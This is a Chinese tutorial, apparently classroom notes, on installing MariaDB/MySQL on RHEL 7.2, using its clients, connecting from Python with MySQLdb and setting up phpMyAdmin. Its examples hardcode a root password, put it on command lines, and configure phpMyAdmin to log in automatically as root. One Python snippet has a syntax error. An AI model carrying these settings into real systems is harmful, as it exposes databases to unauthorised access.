00:00:00 grep --color=auto mysqld# 查看监听端口号[root@mastera0 ~]# netstat -luntp|grep mysqldtcp 0 0 0.0.0.0:3306 0.0.0.0:* LISTEN 2653/mysqld我们任何一个程序安装完成之后都要去看一下他的组成rpm -ql mariadb-server，我们的每个程序都有这样几个部分，配置文件目录、脚本文件目录、数据文件目录、日志文件目录等。我们可以用rpm –ql &lt;程序名&gt;来查看程序的组成。我们可以看到mariadb-server的配置文件为/etc/my.cnf；脚本文件目录为/usr/local/mysql/bin/；数据文件目录为/var/lib/mysql/;日志文件在/var/log/mysql.log。接下来我们详细介绍每一下脚本文件目录中的脚本。 123456789101112131415161718MYSQL服务器和服务器启动脚本：Mysqld MySQL服务器mysqld_safe、mysql.server和mysqld_multi是服务器启动脚本mysql_install_db 初始化数据目录和初始数据库访问服务器的客户程序：mysql 是一个命令行客户程序，用于交互式或以批处理模式执行SQL语句mysqladmin 是用于管理功能的客户程序mysqlcheck 执行表维护操作mysqldump和mysqlhotcopy负责数据库备份mysqlimport 导入数据文件mysqlshow 显示信息数据库和表的相关信息独立于服务器操作的工具程序：myisamchk 执行表维护操作myisampack 产生压缩、只读的表mysqlbinlog 是处理二进制日志文件的实用工具perror 显示错误代码的含义 MySQL客户端的使用 项目 参数 软件名称 mariadb 5.5 命令 mysql 登陆连接mysql服务器 mysqladmin 修改数据库服务器用户密码 mysqldump 备份 mysqlbinlog 二进制日志的查看 12345678910111213141516171819命令的使用mysql 1.服务启动后，mariadb5.5直接登陆，不需要密码 2.退出 \\q exit ctrl+d -u 用户名 空格可有可无 -u root;-uroot -p 密码 不可以有空格 -puplooking # mysql -uroot -puplooking # mysql -uroot -puplooking123mysqladmin 1.无密码情况下添加密码 mysqladmin -uroot password &apos;uplooking&apos; -u 用户名 空格可有可无 -u root;-uroot password 新密码 一定要有空格 2.有密码情况下修改密码 mysqladmin -uroot -puplooking password &apos;uplooking123&apos; -u 用户名 可有可无 -p 当前密码 不能有 password 新密码 有 1234567891011121314151617181920212223242526272829[root@mastera0 ~]# mysql==&gt;未设置密码登陆Welcome to the MariaDB monitor. Commands end with ; or \\g.Your MariaDB connection id is 2Server version: 5.5.41-MariaDB MariaDB ServerCopyright (c) 2000, 2014, Oracle, MariaDB Corporation Ab and others.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.MariaDB [(none)]&gt; \\qBye[root@mastera0 ~]# mysqladmin -uroot password &quot;uplooking&quot;==&gt;设置密码[root@mastera0 ~]# mysql -uroot -p==&gt;登陆Enter password:Welcome to the MariaDB monitor. Commands end with ; or \\g.Your MariaDB connection id is 4Server version: 5.5.41-MariaDB MariaDB ServerCopyright (c) 2000, 2014, Oracle, MariaDB Corporation Ab and others.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.MariaDB [(none)]&gt; show databases==&gt;;分号提交命令+--------------------+| Database|+--------------------+| information_schema |==&gt;临时数据库| mysql|==&gt;做 mysql 初始化的库| performance_schema || test|==&gt;临时共享库,任何人都可以看+--------------------+4 rows in set (0.00 sec)[root@serverg ~]# cat ~/.mysql_history==&gt;查看之前的命令但是不全Bye RHEL 7.2 RPM 包安装 MariaDB 10.2 项目 参数 软件名 MariaDB-server 10.2 service mariadb/mysql daemon mysqld 配置文件 /etc/my.cnf 数据文件 /var/lib/mysql/ 日志文件 默认没有开启 端口号 3306 软件的获取 http://classroom.example.com/materials/mariadb-10.2.repo 卸载冲突包mariadb-libs再安装mariadb-10.2 12# rpm -e mariadb-libs --nodeps# yum install -y MariaDB-server 初始化MariaDB数据库并启动MariaDB服务，并作安全加固 12# systemctl start mysql# mysql_secure_installation 查看MariaDB数据库实例监听的端口 123# netstat -ntpl|grep sqltcp 0 0 0.0.0.0:3306 0.0.0.0:* LISTEN 12877/mysqld tcp 0 0 0.0.0.0:4567 0.0.0.0:* LISTEN 12877/mysqld 客户端 项目名 参数 软件名 MariaDB-client 10.2 命令 mysql,mysqladmin,mysqlbinlog,mysqldump RHEL 7.2 RPM 包安装 MySQL 5.7 项目名 参数 软件名 mysql-community-server 5.7 service mysqld daemon mysqld 配置文件 /etc/my.cnf，/etc/my.cnf.d/*.cnf 数据文件 /var/lib/mysql 启动日志 /var/log/mysqld.log 软件的获取 http://classroom.example.com/materials/mysql-5.7.repo 卸载冲突包mariadb-libs再安装mysql-5.7 12# rpm -e mariadb-libs --nodeps# yum install -y mysql-community-server 初始化MySQL数据库并启动mysqld服务，并作安全加固 12# systemctl start mysqld# mysql_secure_installation 服务端修改初始密码 12# grep password /var/log/mysqld.log# mysqladmin -uroot -p&apos;&apos; password &apos;(Uploo00king)&apos; 客户端 项目名 内容 软件名 mysql-community-client 5.7 命令 mysql,mysqladmin,mysqlbinlog,mysqldump 客户端登陆数据库 mysql -uroot -p&apos;(Uploo00king)&apos; mysql.user表的结构变化了，原先的password列改为了authentication_string列 RHEL 7.2 二进制文件安装 MySQL 5.6 mysql 软件架构 数据目录 /data/mysql/data binlog目录 /data/mysql/log-data pid文件 /data/tmp 临时目录 /data1/tmp/ 以上目录所属者和所属组都需要为mysql.mysql 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091[root@mastera0 ~]# tar -xf mysql-5.6.20-linux-glibc2.5-x86_64.tar.gz [root@mastera0 ~]# cd mysql-5.6.20-linux-glibc2.5-x86_64[root@mastera0 mysql-5.6.20-linux-glibc2.5-x86_64]# lsbin COPYING data docs include INSTALL-BINARY lib man mysql-test README scripts share sql-bench support-files[root@mastera0 mysql-5.6.20-linux-glibc2.5-x86_64]# cat INSTALL-BINARY... ... To install and use a MySQL binary distribution, the basic command sequence looks like this:shell&gt; groupadd mysqlshell&gt; useradd -r -g mysql mysqlshell&gt; cd /usr/localshell&gt; tar zxvf /path/to/mysql-VERSION-OS.tar.gzshell&gt; ln -s full-path-to-mysql-VERSION-OS mysqlshell&gt; cd mysqlshell&gt; chown -R mysql .shell&gt; chgrp -R mysql .shell&gt; scripts/mysql_install_db --user=mysqlshell&gt; chown -R root .shell&gt; chown -R mysql datashell&gt; bin/mysqld_safe --user=mysql &amp;# Next command is optionalshell&gt; cp support-files/mysql.server /etc/init.d/mysql.server... ...[root@mastera0 mysql-5.6.20-linux-glibc2.5-x86_64]# groupadd mysql[root@mastera0 mysql-5.6.20-linux-glibc2.5-x86_64]# cd ..[root@mastera0 ~]# useradd -r -g mysql mysql[root@mastera0 ~]# cd /usr/local[root@mastera0 local]# mv /root/mysql-5.6.20-linux-glibc2.5-x86_64 .[root@mastera0 local]# lsbin games lib libexec sbin srcetc include lib64 mysql-5.6.20-linux-glibc2.5-x86_64 share[root@mastera0 local]# ln -s mysql-5.6.20-linux-glibc2.5-x86_64 mysql[root@mastera0 local]# ll mysqllrwxrwxrwx. 1 root root 34 Dec 11 12:20 mysql -&gt; mysql-5.6.20-linux-glibc2.5-x86_64[root@mastera0 mysql]# cd mysql[root@mastera0 mysql]# mkdir /data/mysql/data -p[root@mastera0 mysql]# chown mysql. /data/mysql/data[root@mastera0 mysql]# chown mysql. /data/mysql/data -R[root@mastera0 mysql]# ll -d /data/mysql/datadrwxr-xr-x. 2 mysql mysql 4096 Dec 11 12:24 /data/mysql/data[root@mastera0 mysql]# scripts/mysql_install_db --user=mysql --datadir=/data/mysql/data --basedir=/usr/local/mysql[root@mastera0 mysql]# ll /data/mysql/datatotal 110604-rw-rw----. 1 mysql mysql 12582912 Dec 11 12:28 ibdata1-rw-rw----. 1 mysql mysql 50331648 Dec 11 12:28 ib_logfile0-rw-rw----. 1 mysql mysql 50331648 Dec 11 12:28 ib_logfile1drwx------. 2 mysql mysql 4096 Dec 11 12:28 mysqldrwx------. 2 mysql mysql 4096 Dec 11 12:28 performance_schemadrwx------. 2 mysql mysql 4096 Dec 11 12:28 test[root@mastera0 mysql]# vim /etc/my.cnf[client]#如果不认识这个参数会忽略loose-default-character-set=utf8loose-prompt=&apos;\\u@\\h:\\p [\\d]&gt;&apos;socket=/tmp/mysql.sock[mysqld]basedir = /usr/local/mysqldatadir = /data/mysql/datauser=mysqlport = 3306socket=/tmp/mysql.sockpid-file=/data/tmp/mysql.pidtmpdir=/data1/tmpcharacter_set_server=utf8#skipskip-external_locking=1skip-name-resolve=1#AB replicationserver-id = 1log-bin = /data/mysql/log-data/masterabinlog_format=rowmax_binlog_cache_size=2000Mmax_binlog_size=1Gsync_binlog=1#expire_logs_days=7#semi_syncrpl_semi_sync_master_enabled=1rpl_semi_sync_master_timeout=1000[root@mastera0 mysql]# pwd/usr/local/mysql[root@mastera0 mysql]# cp support-files/mysql.server /etc/init.d/mysql[root@mastera0 mysql]# echo export PATH=$PATH:/usr/local/mysql/support-files/ &gt;&gt; /etc/bashrc[root@mastera0 mysql]# service mysql start 脚本实现自动安装MySQL如果需要同时安装10台甚至1000台，通过脚本来完成一定是极好的！ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115#!/bin/bash# auto_install_mysql_5.6.20 # 参数设置# --binpos=指定mysql二进制安装包的位置# --basedir=指定mysql安装位置# --datadir=指定mysql数据存放位置# --binlogdir=指定mysqlbinlog存放位置# --piddir=指定mysql进程存放位置# --tmpdir=指定mysql临时文件位置# --help 查看帮助# eg. auto_install_mysql_5.6.20 --binpos=/tmp/mysql.tar.gz --datadir=/data/mysql/data --basedir=/usr/local/mysql# 遍历位置参数，获取对应的参数值for i in ${@}do case ${i%=*} in --binpos) binpos=${i#*=};; --basedir) basedir=${i#*=};; --datadir) datadir=${i#*=};; --binlogdir) binlogdir=${i#*=};; --piddir) piddir=${i#*=};; --tmpdir) tmpdir=${i#*=};; esacdoneTAR(){# 解压mysql二进制安装包到指定mysql安装位置tar -xf $binpos -C /tmp &amp;&gt; /dev/nullrpm=${binpos##*/}rm -r $basedir mkdir $basedir -p mv /tmp/${rpm%.tar.gz}/* $basedir}ADD_user_dir(){# 创建mysql用户和组# 创建数据目录，二进制日志存放路径，临时目录，pid目录useradd mysql &amp;&gt; /dev/null for i in $datadir $binlogdir $piddir $tmpdir;do rm -r $i mkdir $i -p &amp;&gt; /dev/null chown -R mysql:mysql $idone}INIT(){# 通过脚本生成初始化数据$basedir/scripts/mysql_install_db --user=mysql --datadir=$datadir --basedir=$basedir}CONF(){# 获取服务器IP地址的主机位，用作server-id的值serverid=`ifconfig|grep -A 1 eno|tail -n 1|awk &apos;{print $2}&apos;|awk -F &apos;.&apos; &apos;{print $4}&apos;`cat &gt; /etc/my.cnf &lt;&lt; ENDF[client]#如果不认识这个参数会忽略loose-default-character-set=utf8loose-prompt=&apos;\\u@\\h:\\p [\\d]&gt;&apos;socket=/tmp/mysql.sock[mysqld]basedir = $basedirdatadir = $datadiruser=mysqlport = 3306socket=/tmp/mysql.sockpid-file=$piddir/mysql.pidtmpdir=$tmpdircharacter_set_server=utf8#skipskip-external_locking=1skip-name-resolve=1#AB replicationserver-id = $serveridlog-bin = $binlogdir/`hostname|awk -F . &apos;{print $1}&apos;`binlog_format=rowmax_binlog_cache_size=2000Mmax_binlog_size=1Gsync_binlog=1#expire_logs_days=7#semi_sync#rpl_semi_sync_master_enabled=1#rpl_semi_sync_master_timeout=1000ENDF# 将数据库服务启动脚本复制到/etc/init.d/cp $basedir/support-files/mysql.server /etc/init.d/mysql# 修改PATH路径，将mysql相关命令所在目录加入echo export PATH=$PATH:$basedir/support-files/ &gt;&gt; /etc/bashrcsource /etc/bashrc}Main(){TAR ADD_user_dir INIT CONF }Main 总结 相对于rpm包安装，二进制安装稍复杂一点，但只需要实现规划好basedir、datadir、binlogdir、tmpdir等路径即可 另需要注意给mysql使用的相关目录的权限为mysql:mysql 还有就是，如果已经安装过其他版本的数据库，记得卸载干净了。 此处安装的只是服务端，客户端需要另外安装。 MySQL客户端连接数据库MySQL客户端的使用上一节安装MySQL服务端时已经讲解过客户端的使用，此处不再赘述。 python连接MySQL数据库Python 标准数据库接口为 Python DB-API，Python DB-API为开发人员提供了数据库应用编程接口。 Python 数据库接口支持非常多的数据库，你可以选择适合你项目的数据库： GadFly mSQL MySQL PostgreSQL Microsoft SQL Server 2000 Informix Interbase Oracle Sybase 你可以访问Python数据库接口及API查看详细的支持数据库列表。 不同的数据库你需要下载不同的DB API模块，例如你需要访问Oracle数据库和Mysql数据，你需要下载Oracle和MySQL数据库模块。 DB-API 是一个规范. 它定义了一系列必须的对象和数据库存取方式, 以便为各种各样的底层数据库系统和多种多样的数据库接口程序提供一致的访问接口 。 Python的DB-API，为大多数的数据库实现了接口，使用它连接各数据库后，就可以用相同的方式操作各数据库。 Python DB-API使用流程： 引入 API 模块。 获取与数据库的连接。 执行SQL语句和存储过程。 关闭数据库连接。 什么是MySQLdb? MySQLdb 是用于Python链接Mysql数据库的接口，它实现了 Python 数据库 API 规范 V2.0，基于 MySQL C API 上建立的。 如何安装MySQLdb? 安装MySQLdb，请访问 http://sourceforge.net/projects/mysql-python ，(Linux平台可以访问：https://pypi.python.org/pypi/MySQL-python)从这里可选择适合您的平台的安装包，分为预编译的二进制文件和源代码安装包。如果您选择二进制文件发行版本的话，安装过程基本安装提示即可完成。如果从源代码进行安装的话，则需要切换到MySQLdb发行版本的顶级目录，并键入下列命令: 12345$ gunzip MySQL-python-1.2.2.tar.gz$ tar -xvf MySQL-python-1.2.2.tar$ cd MySQL-python-1.2.2$ python setup.py build$ python setup.py install 下载安装包 MySQL-python 12345678910111213141516171819[root@localhost ~]# lsMySQL-python-1.2.5.zip[root@localhost ~]# unzip MySQL-python-1.2.5.zip [root@localhost ~]# cd MySQL-python-1.2.5/[root@localhost MySQL-python-1.2.5]# lsoc MANIFEST.in _mysql_exceptions.py README.md setup_posix.py site.cfgGPL-2.0 metadata.cfg MySQL_python.egg-info setup.cfg setup_posix.pyc testsHISTORY _mysql.c PKG-INFO setup_common.py setup.pyINSTALL MySQLdb pymemcompat.h setup_common.pyc setup_windows.py[root@localhost MySQL-python-1.2.5]# python setup.py buildsh: mysql_config: command not foundTraceback (most recent call last): File &quot;setup.py&quot;, line 17, in &lt;module&gt; metadata, options = get_config() File &quot;/root/MySQL-python-1.2.5/setup_posix.py&quot;, line 43, in get_config libs = mysql_config(&quot;libs_r&quot;) File &quot;/root/MySQL-python-1.2.5/setup_posix.py&quot;, line 25, in mysql_config raise EnvironmentError(&quot;%s not found&quot; % (mysql_config.path,))EnvironmentError: mysql_config not found 缺少mysql_config命令 该命令是由mysql-devel或者mariadb-devel安装生成，因此先检查是否安装，在检车site.cfg中mysql_config的路径是否正确 12345678910[root@localhost MySQL-python-1.2.5]# which mysql_config/usr/bin/which: no mysql_config in (/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin)[root@localhost MySQL-python-1.2.5]# yum install -y mariadb-devel[root@localhost MySQL-python-1.2.5]# which mysql_config/usr/bin/mysql_config[root@localhost MySQL-python-1.2.5]# vim site.cfgmysql_config=/usr/bin/mysql_config 开始编译安装 12[root@localhost MySQL-python-1.2.5]# python setup.py build[root@localhost MySQL-python-1.2.5]# python setup.py install 加载模块 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071In [2]: import MySQLdbIn [3]: dir(MySQLdb)Out[3]: [&apos;BINARY&apos;, &apos;Binary&apos;, &apos;Connect&apos;, &apos;Connection&apos;, &apos;DATE&apos;, &apos;DATETIME&apos;, &apos;DBAPISet&apos;, &apos;DataError&apos;, &apos;DatabaseError&apos;, &apos;Date&apos;, &apos;DateFromTicks&apos;, &apos;Error&apos;, &apos;FIELD_TYPE&apos;, &apos;IntegrityError&apos;, &apos;InterfaceError&apos;, &apos;InternalError&apos;, &apos;MySQLError&apos;, &apos;NULL&apos;, &apos;NUMBER&apos;, &apos;NotSupportedError&apos;, &apos;OperationalError&apos;, &apos;ProgrammingError&apos;, &apos;ROWID&apos;, &apos;STRING&apos;, &apos;TIME&apos;, &apos;TIMESTAMP&apos;, &apos;Time&apos;, &apos;TimeFromTicks&apos;, &apos;Timestamp&apos;, &apos;TimestampFromTicks&apos;, &apos;Warning&apos;, &apos;__all__&apos;, &apos;__author__&apos;, &apos;__builtins__&apos;, &apos;__doc__&apos;, &apos;__file__&apos;, &apos;__loader__&apos;, &apos;__name__&apos;, &apos;__package__&apos;, &apos;__path__&apos;, &apos;__revision__&apos;, &apos;__version__&apos;, &apos;_mysql&apos;, &apos;apilevel&apos;, &apos;connect&apos;, &apos;connection&apos;, &apos;constants&apos;, &apos;debug&apos;, &apos;escape&apos;, &apos;escape_dict&apos;, &apos;escape_sequence&apos;, &apos;escape_string&apos;, &apos;get_client_info&apos;, &apos;paramstyle&apos;, &apos;release&apos;, &apos;result&apos;, &apos;server_end&apos;, &apos;server_init&apos;, &apos;string_literal&apos;, &apos;test_DBAPISet_set_equality&apos;, &apos;test_DBAPISet_set_equality_membership&apos;, &apos;test_DBAPISet_set_inequality&apos;, &apos;test_DBAPISet_set_inequality_membership&apos;, &apos;thread_safe&apos;, &apos;threadsafety&apos;, &apos;times&apos;, &apos;version_info&apos; 数据库连接 连接数据库前，请先确认以下事项： 数据库服务已经启动，并已创建了数据库 test1 在test1数据库中您已经创建了表 db1 t1表字段为 id,first_name,last_name,age,sex,income 连接数据库t1使用的用户名为 “root” ，密码为 “uplooking” 12345678910111213141516[root@localhost ~]# systemctl start mariadb[root@localhost ~]# mysqladmin -uroot password &apos;uplooking&apos;[root@localhost ~]# mysql -uroot -puplookingWelcome to the MariaDB monitor. Commands end with ; or \\g.Your MariaDB connection id is 4Server version: 5.5.44-MariaDB-log MariaDB ServerCopyright (c) 2000, 2015, Oracle, MariaDB Corporation Ab and others.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.MariaDB [(none)]&gt; create database db1;Query OK, 1 row affected (0.01 sec)MariaDB [(none)]&gt; create table db1.t1 (id int auto_increment primary key,first_name varchar(50),last_name varchar(50),age int,sex char(1),income float);Query OK, 0 rows affected (0.09 sec) 实例1：连接数据库获取数据库版本信息 123456789101112131415161718192021222324252627[root@localhost python-mysql]# vim getversion.py #!/usr/bin/python# -*- coding: UTF-8 -*-import MySQLdb# 打开数据库连接db = MySQLdb.connect(&quot;localhost&quot;,&quot;root&quot;,&quot;uplooking&quot;,&quot;db1&quot; )# 使用cursor()方法获取操作游标 cursor = db.cursor()# 使用execute方法执行SQL语句cursor.execute(&quot;SELECT VERSION()&quot;)# 使用 fetchone() 方法获取一条数据库。data = cursor.fetchone()print &quot;Database version : %s &quot; % data# 关闭数据库连接db.close()# 执行结果[root@localhost python-mysql]# python getversion.py Database version : 5.5.44-MariaDB-log 实例2：查询mysql中的db1.t1表的结构（数据字典）信息 12345678910111213141516171819202122232425262728#!/usr/bin/python# -*- coding: UTF-8 -*-import MySQLdbimport syssql=sys.argv[1]# 打开数据库连接db = MySQLdb.connect(&quot;localhost&quot;,&quot;root&quot;,&quot;uplooking&quot;,&quot;db1&quot; )# 使用cursor()方法获取操作游标 cursor = db.cursor()# 使用execute方法执行SQL语句cursor.execute(sql)# 使用 fetchone() 方法获取一条数据库。data = cursor.fetchall()for i in data: for j in i: sys.stdout.write(str(j)+&apos;\\t&apos;) sys.stdout.write(&apos;\\n&apos;)# 关闭数据库连接db.close() 脚本带参数执行： 1234567[root@localhost python-mysql]# python select.py &quot;desc db1.t1&quot;id int(11) NO PRI None auto_increment first_name varchar(50) YES None last_name varchar(50) YES None age int(11) YES None sex char(1) YES None income float YES None 数据库查询操作 Python查询Mysql使用 fetchone() 方法获取单条数据, 使用fetchall() 方法获取多条数据。 fetchone(): 该方法获取下一个查询结果集。结果集是一个对象 fetchall():接收全部的返回结果行. rowcount: 这是一个只读属性，并返回执行execute()方法后影响的行数。 实例3：获取mysql数据库的变量值 1234567891011121314151617181920212223242526#!/usr/bin/python# -*- coding: UTF-8 -*-import MySQLdbimport syskey=sys.argv[1]sql=&quot;select @@&quot;+key# 打开数据库连接db = MySQLdb.connect(&quot;localhost&quot;,&quot;root&quot;,&quot;uplooking&quot;,&quot;db1&quot; )# 使用cursor()方法获取操作游标 cursor = db.cursor()# 使用execute方法执行SQL语句cursor.execute(sql)# 使用 fetchone() 方法获取一条数据库。data = cursor.fetchall()print &quot;{} : {}&quot;.format(sys.argv[1],data[0]) # 关闭数据库连接db.close() 获取innodb_version\\innodb_buffer_pool_size 12345[root@localhost python-mysql]# python Get_variables.py innodb_versioninnodb_version : 5.5.43-MariaDB-37.2[root@localhost python-mysql]# vim Get_variables.py [root@localhost python-mysql]# python Get_variables.py innodb_buffer_pool_sizeinnodb_buffer_pool_size : 134217728 实例4：创建数据库表 如果数据库连接存在我们可以使用execute()方法来为数据库创建表，如下所示创建表t2： 1234567891011121314151617181920212223242526#!/usr/bin/python# -*- coding: UTF-8 -*-import MySQLdb# 打开数据库连接db = MySQLdb.connect(&quot;localhost&quot;,&quot;root&quot;,&quot;uplooking&quot;,&quot;db1&quot; )# 使用cursor()方法获取操作游标 cursor = db.cursor()# 如果数据表已经存在使用 execute() 方法删除表。cursor.execute(&quot;DROP TABLE IF EXISTS t2&quot;)# 创建数据表SQL语句sql = &quot;&quot;&quot;CREATE TABLE t2 ( FIRST_NAME CHAR(20) NOT NULL, LAST_NAME CHAR(20), AGE INT, SEX CHAR(1), INCOME FLOAT )&quot;&quot;&quot;cursor.execute(sql)# 关闭数据库连接db.close() 执行该脚本 123456789101112131415[root@localhost python-mysql]# python createdb.py createdb.py:13: Warning: Unknown table &apos;t2&apos; cursor.execute(&quot;DROP TABLE IF EXISTS t2&quot;)[root@localhost python-mysql]# lscreatedb.py Get_variables.py getversion.py select.py#查看表的结构[root@localhost python-mysql]# python select.py &quot;desc db1.t2&quot;FIRST_NAME char(20) NO None LAST_NAME char(20) YES None AGE int(11) YES None SEX char(1) YES None INCOME float YES None 实例5：数据库插入操作 以下实例使用执行 SQL INSERT 语句向表 db1.t1 插入记录： 1234567891011121314151617181920212223242526#!/usr/bin/python# -*- coding: UTF-8 -*-import MySQLdb# 打开数据库连接db = MySQLdb.connect(&quot;localhost&quot;,&quot;root&quot;,&quot;uplooking&quot;,&quot;db1&quot; )# 使用cursor()方法获取操作游标 cursor = db.cursor()# SQL 插入语句sql = &quot;&quot;&quot;INSERT INTO t1(FIRST_NAME, LAST_NAME, AGE, SEX, INCOME) VALUES (&apos;Mac&apos;, &apos;Mohan&apos;, 20, &apos;M&apos;, 2000)&quot;&quot;&quot;try: # 执行sql语句 cursor.execute(sql) # 提交到数据库执行 db.commit()except: # Rollback in case there is any error db.rollback()# 关闭数据库连接db.close() 执行该脚本，并查看db1.t1表中的所有内容 123[root@localhost python-mysql]# python insert_table.py [root@localhost python-mysql]# python select.py &quot;select * from db1.t1&quot;1 Mac Mohan 20 M 2000.0 实例6：删除操作 删除操作用于删除数据表中的数据，以下实例演示了删除数据表 db1 中 AGE 大于 20 的所有数据： 123456789101112131415161718192021222324#!/usr/bin/python# -*- coding: UTF-8 -*-import MySQLdb# 打开数据库连接db = MySQLdb.connect(&quot;localhost&quot;,&quot;root&quot;,&quot;uplooking&quot;,&quot;db1&quot; ))# 使用cursor()方法获取操作游标 cursor = db.cursor()# SQL 删除语句sql = &quot;DELETE FROM db1.t1 WHERE age &gt; 20&quot;try: # 执行SQL语句 cursor.execute(sql) # 提交修改 db.commit()except: # 发生错误时回滚 db.rollback()# 关闭连接db.close() 实例7：执行事务 事务机制可以确保数据一致性。 事务应该具有4个属性：原子性、一致性、隔离性、持久性。这四个属性通常称为ACID特性。 原子性（atomicity）。一个事务是一个不可分割的工作单位，事务中包括的诸操作要么都做，要么都不做。 一致性（consistency）。事务必须是使数据库从一个一致性状态变到另一个一致性状态。一致性与原子性是密切相关的。 隔离性（isolation）。一个事务的执行不能被其他事务干扰。即一个事务内部的操作及使用的数据对并发的其他事务是隔离的，并发执行的各个事务之间不能互相干扰。 持久性（durability）。持续性也称永久性（permanence），指一个事务一旦提交，它对数据库中数据的改变就应该是永久性的。接下来的其他操作或故障不应该对其有任何影响。 Python DB API 2.0 的事务提供了两个方法 commit 或 rollback。 实例： 12345678910# SQL删除记录语句sql = &quot;DELETE FROM db1.t1 WHERE age &gt; 20&quot;try: # 执行SQL语句 cursor.execute(sql) # 向数据库提交 db.commit()except: # 发生错误时回滚 db.rollback() 对于支持事务的数据库， 在Python数据库编程中，当游标建立之时，就自动开始了一个隐形的数据库事务。 commit()方法游标的所有更新操作，rollback（）方法回滚当前游标的所有操作。每一个方法都开始了一个新的事务。 错误处理 DB API中定义了一些数据库操作的错误及异常，下表列出了这些错误和异常: 异常 描述 Warning 当有严重警告时触发，例如插入数据是被截断等等。必须是 StandardError 的子类。 Error 警告以外所有其他错误类。必须是 StandardError 的子类。 InterfaceError 当有数据库接口模块本身的错误（而不是数据库的错误）发生时触发。 必须是Error的子类。 DatabaseError 和数据库有关的错误发生时触发。 必须是Error的子类。 DataError 当有数据处理时的错误发生时触发，例如：除零错误，数据超范围等等。 必须是DatabaseError的子类。 OperationalError 指非用户控制的，而是操作数据库时发生的错误。例如：连接意外断开、 数据库名未找到、事务处理失败、内存分配错误等等操作数据库是发生的错误。 必须是DatabaseError的子类。 IntegrityError 完整性相关的错误，例如外键检查失败等。必须是DatabaseError子类。 InternalError 数据库的内部错误，例如游标（cursor）失效了、事务同步失败等等。 必须是DatabaseError子类。 ProgrammingError 程序错误，例如数据表（table）没找到或已存在、SQL语句语法错误、 参数数量错误等等。必须是DatabaseError的子类。 NotSupportedError 不支持错误，指使用了数据库不支持的函数或API等。例如在连接对象上 使用.rollback()函数，然而数据库并不支持事务或者事务已关闭。 必须是DatabaseError的子类。 总结 安装模块 mysql-python 加载模块 import MySQLdb 打开数据库连接 db = MySQLdb.connect(host,user,password,database)) 使用cursor()方法获取操作游标事务开始 cursor = db.cursor() 执行SQL语句 cursor.execute(sql) 向数据库提交 db.commit() 发生错误时回滚 db.rollback() 关闭连接 db.close() PHPmyAdmin在线工具使用PHPMYADMIN 是一个使用 PHP 语言编写的,使用 web 管理 MYSQL 的组件。严格意义上说,它也是一种 MYSQL 的客户端。最近一段时间,出现的很多依靠网站连接 MYSQL 进行管理的产品,在这些“WEB GUI”中,PHPMYADMIN 是使用范围最为广泛的,同时也受到很多 MYSQL 数据库管理员的好评。通过它,你可以非常轻松,非常方便的管理 MYSQL 数据库 获取 PHPMYADMIN 你可以到 PHPMYADMIN 的官方网站 http://www.phpmyadmin.net 下载最新的版本。 安装 PHPMYADMIN 12345678910111213141516171819202122232425262728293031323334353637383940411.yum install -y httpd php php-mysql mariadb-server php-mbstringftp://rpmfind.net/linux/centos/7.2.1511/os/x86_64/Packages/php-mbstring-5.4.16-36.el7_1.x86_64.rpm2.systemctl start httpd3.systemctl start mariadb4.mysqladmin -uroot password uplooking5.mysql -uroot -puplooking&gt;create database phpmyadmin&gt;grant all on phpmyadmin.* to php@localhost identified by &apos;uplooking&apos;;&gt;flush privileges;6.echo hi &gt; /var/www/html/index.html测试一下web服务是否成功7.tar jxf /mnt/courses/db100/rhel7.2/materials/phpMyAdmin-4.4.15.5-all-languages.tar.bz2 -C /var/www/html8.chmod -R 755 html9.mv config.sample.inc.php config.sample.inc;vim config.inc.php$cfg[&apos;blowfish_secret&apos;] = &apos;&apos;; /* YOU MUST FILL IN THIS FOR COOKIE AUTH! *//* * Servers configuration */$i = 0;/* * First server */$i++;/* Authentication type */$cfg[&apos;Servers&apos;][$i][&apos;user&apos;] = &apos;root&apos;;$cfg[&apos;Servers&apos;][$i][&apos;password&apos;] = &apos;uplooking&apos;;$cfg[&apos;Servers&apos;][$i][&apos;auth_type&apos;] = &apos;config&apos;;10.vim /etc/httpd/conf/httpd.conf&lt;IfModule dir_module&gt; DirectoryIndex index.html index.php&lt;/IfModule&gt;11.systemctl restart httpd从浏览器输入172.25.0.10 默认安装phpMyAdmin，通常只能连一台MySql服务器，其配置信息是保存在phpMyAdmin的配置文件里的，当我们需要在多台服务器之间进行切换登陆的时候，修改起来非常麻烦。遵照下面的配置方法，我们可以方便的使用phpMyAdmin连接多台MySQL。 登陆phpMyAdmin时只需输入用户名、密码，服务器地址为下拉列表可选，登陆后也可选择其他服务器快速切换。 （推荐） 优点：登陆操作简便，登陆后切换服务器无须退出当前连接。 1234567891011121314151617$hosts = array(&apos;1&apos;=&gt;array(&apos;host&apos;=&gt;&apos;localhost&apos;,&apos;user&apos;=&gt;&apos;root&apos;,&apos;password&apos;=&gt;&apos;uplooking&apos;),&apos;2&apos;=&gt;array(&apos;host&apos;=&gt;&apos;172.25.0.11&apos;,&apos;user&apos;=&gt;&apos;root&apos;,&apos;password&apos;=&gt;&apos;uplooking&apos;));for ($i=1;$i&lt;=count($hosts);$i++){/* Authentication type */$cfg[&apos;Servers&apos;][$i][&apos;user&apos;] = $hosts[$i][&apos;user&apos;];$cfg[&apos;Servers&apos;][$i][&apos;password&apos;] = $hosts[$i][&apos;password&apos;];$cfg[&apos;Servers&apos;][$i][&apos;auth_type&apos;] = &apos;config&apos;;/* Server parameters */$cfg[&apos;Servers&apos;][$i][&apos;host&apos;] = $hosts[$i][&apos;host&apos;];$cfg[&apos;Servers&apos;][$i][&apos;connect_type&apos;] = &apos;tcp&apos;;$cfg[&apos;Servers&apos;][$i][&apos;compress&apos;] = false;$cfg[&apos;Servers&apos;][$i][&apos;AllowNoPassword&apos;] = false;} MySQL Workbench 连接数据库MySQL Workbench 是一款专门为用户提供了用于创建、修改、执行和优化SQL的可视化工具，开发人员可以很轻松的管理数数据。该工具并且提供开发者一整套可视化用于创建、编辑和管理SQL 